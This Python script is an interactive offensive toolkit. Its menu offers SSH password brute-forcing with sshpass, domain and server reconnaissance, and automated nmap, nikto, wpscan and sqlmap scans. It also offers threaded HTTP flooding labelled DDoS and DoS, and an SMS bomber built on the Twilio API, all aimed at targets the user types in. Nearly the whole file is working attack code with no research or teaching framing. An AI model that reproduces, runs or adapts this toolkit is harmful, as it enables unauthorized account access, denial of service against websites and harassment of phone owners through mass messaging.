import logging
import socket
import subprocess
import os
import sys
import time
import requests
import random
import string
import whois
import json
import threading

logging.basicConfig(filename='bruteforce_success.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_ip_address(domain):
    try:
        ip_address = socket.gethostbyname(domain)
        return ip_address
    except socket.gaierror:
        return None

def get_domain_info(domain):
    try:
        domain_info = whois.whois(domain)
        return domain_info
    except Exception as e:
        return str(e)

def get_server_info(ip_address):
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}/json")
        return response.json()
    except requests.RequestException as e:
        return str(e)

def prompt_for_input():
    domain = input("Please enter a domain: ")
    username = input("Enter Username: ")
    return domain, username

def generate_passwords(filename, count=10000, length=8):
    characters = string.ascii_letters + string.digits
    with open(filename, 'w') as f:
        for _ in range(count):
            password = ''.join(random.choice(characters) for _ in range(length))
            f.write(password + '\n')

def brute_force(ip_address, username, wordlist_path):
    if not os.path.isfile(wordlist_path):
        print("Error: Wordlist file not found!")
        sys.exit(1)
    elif not os.access(wordlist_path, os.R_OK):
        print("Error: Wordlist file is not readable!")
        sys.exit(1)

    if subprocess.run(["which", "sshpass"], stdout=subprocess.PIPE, stderr=subprocess.PIPE).returncode != 0:
        print("Error: sshpass is not installed. Please install it and try again.")
        sys.exit(1)

    with open(wordlist_path, 'r') as wordlist:
        for password in wordlist:
            password = password.strip()
            print(f"Trying password: {password}")
            result = subprocess.run(["sshpass", "-p", password, "ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5", f"{username}@{ip_address}", "exit"])
            if result.returncode == 0:
                print(f"Password found: {password}")
                logging.info(f"Password found for {username}@{ip_address}: {password}")
                sys.exit(0)
            elif result.returncode == 5:
                print("Connection refused or timeout")
                sys.exit(1)
            time.sleep(1)

    print("Password not found.")
    sys.exit(1)

def save_to_json(domain, domain_info, server_info):
    data = {
        'domain': domain,
        'domain_info': domain_info,
        'server_info': server_info
    }
    with open('protecth.json', 'w') as json_file:
        json.dump(data, json_file, indent=2)

def nmap_scan(ip_address):
    print(f"Running nmap scan on {ip_address}")
    result = subprocess.run(["nmap", "-sV", ip_address], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(result.stdout.decode())
    if result.returncode != 0:
        print("nmap scan completed with errors.")
    else:
        print("nmap scan completed successfully.")

def nikto_scan(url):
    print(f"Running nikto scan on {url}")
    result = subprocess.run(["nikto", "-h", url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(result.stdout.decode())
    if result.returncode != 0:
        print("nikto scan completed with errors.")
    else:
        print("nikto scan completed successfully.")

def wpscan(url):
    print(f"Running wpscan on {url}")
    result = subprocess.run(["wpscan", "--url", url, "--disable-tls-checks"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(result.stdout.decode())
    if result.returncode != 0:
        print("wpscan completed with errors.")
    else:
        print("wpscan completed successfully.")

def sqlmap_scan(url):
    print(f"Running sqlmap on {url}")
    result = subprocess.run(["sqlmap", "-u", url, "--batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    print(result.stdout.decode())
    if result.returncode != 0:
        print("sqlmap scan completed with errors.")
    else:
        print("sqlmap scan completed successfully.")

def ddos_attack(url, threads=100):
    def attack():
        while True:
            try:
                requests.get(url)
                print(f"Sent request to {url}")
            except requests.RequestException as e:
                print(f"Error: {e}")

    print(f"Starting DDoS attack on {url} with {threads} threads")
    for _ in range(threads):
        thread = threading.Thread(target=attack)
        thread.start()

def dos_attack(url, rate_limit=10, delay_range=(1, 3)):
    def attack():
        while True:
            try:
                response = requests.get(url)
                print(f"Sent request to {url} - Status code: {response.status_code}")
                logging.info(f"Sent request to {url} - Status code: {response.status_code}")
                time.sleep(random.uniform(*delay_range))
            except requests.RequestException as e:
                print(f"Error: {e}")
                logging.error(f"Error: {e}")
            time.sleep(rate_limit)

    print(f"Starting DoS attack on {url} with rate limit {rate_limit} seconds and random delay between {delay_range[0]} to {delay_range[1]} seconds")
    logging.info(f"Starting DoS attack on {url} with rate limit {rate_limit} seconds and random delay between {delay_range[0]} to {delay_range[1]} seconds")
    attack_thread = threading.Thread(target=attack)
    attack_thread.start()

def sms_bomber(phone_number, message, count):
    for i in range(count):
        try:
            response = requests.post(
                "https://api.twilio.com/2010-04-01/Accounts/YOUR_ACCOUNT_SID/Messages.json",
                auth=("YOUR_ACCOUNT_SID", "YOUR_AUTH_TOKEN"),
                data={"From": "YOUR_TWILIO_NUMBER",
                      "To": phone_number,
                      "Body": message})
            print(f"Sent SMS {i+1} to {phone_number} - Status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error: {e}")

def main():
    while True:
        print("Choose an option:")
        print("1. Brute Force")
        print("2. Web")
        print("3. SQL")
        print("4. DDoS Attack")
        print("5. DoS Attack")
        print("6. SMS Bomber")
        print("7. Exit")

        choice = input("Enter your choice (1, 2, 3, 4, 5, 6 or 7): ")

        if choice == '1':
            domain, username = prompt_for_input()
            wordlist_path = f'{username}_rockyou.txt'
            generate_passwords(wordlist_path)
            ip_address = get_ip_address(domain)
            if not ip_address:
                print(f"{domain}: Unable to find IP address")
                sys.exit(1)
            brute_force(ip_address, username, wordlist_path)

        elif choice == '2':
            domain = input("Please enter a domain: ")
            ip_address = get_ip_address(domain)
            if ip_address:
                print(f"{domain}: {ip_address}")
                domain_info = get_domain_info(domain)
                server_info = get_server_info(ip_address)
                print(f"Domain Info: {domain_info}")
                print(f"Server Info: {json.dumps(server_info, indent=2)}")
                save_to_json(domain, domain_info, server_info)
            else:
                print(f"{domain}: Unable to find IP address")

        elif choice == '3':
            scan_choice = input("Choose a scan type: (1) nmap, (2) nikto, (3) wpscan, (4) sqlmap: ")
            if scan_choice == '1':
                domain = input("Please enter a domain: ")
                ip_address = get_ip_address(domain)
                if ip_address:
                    nmap_scan(ip_address)
                else:
                    print(f"{domain}: Unable to find IP address")
            elif scan_choice == '2':
                url = input("Please enter a URL to scan with nikto: ")
                nikto_scan(url)
            elif scan_choice == '3':
                url = input("Please enter a URL to scan with wpscan: ")
                wpscan(url)
            elif scan_choice == '4':
                url = input("Please enter a URL to scan with sqlmap: ")
                sqlmap_scan(url)
            else:
                print("Invalid scan type choice.")
                sys.exit(1)

        elif choice == '4':
            url = input("Please enter a URL to attack: ")
            threads = int(input("Enter number of threads: "))
            ddos_attack(url, threads)

        elif choice == '5':
            url = input("Please enter a URL to attack: ")
            rate_limit = int(input("Enter rate limit in seconds: "))
            delay_range = (int(input("Enter minimum delay in seconds: ")), int(input("Enter maximum delay in seconds: ")))
            dos_attack(url, rate_limit, delay_range)

        elif choice == '6':
            phone_number = input("Please enter the target phone number: ")
            message = input("Enter the message to send: ")
            count = int(input("Enter the number of messages to send: "))
            sms_bomber(phone_number, message, count)

        elif choice == '7':
            print("Exiting...")
            sys.exit(0)

        else:
            print("Invalid choice. Please enter 1, 2, 3, 4, 5, 6 or 7.")

if __name__ == '__main__':
    main()